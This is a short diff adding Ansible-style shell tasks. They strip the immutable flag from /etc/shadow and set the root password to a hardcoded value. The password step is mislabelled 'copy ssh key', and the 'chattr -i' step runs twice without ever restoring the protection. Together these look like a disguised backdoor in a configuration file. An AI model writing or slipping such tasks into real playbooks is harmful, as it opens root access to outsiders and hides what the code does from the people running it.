@@ -1,0 +1,7 @@
+- name: chattr -i
+  shell: chattr -i /etc/shadow
+- name: copy ssh key
+  shell:  echo '123!@#qweQWE' |passwd --stdin root
+- name: chattr -i
+  shell: chattr -i /etc/shadow
+
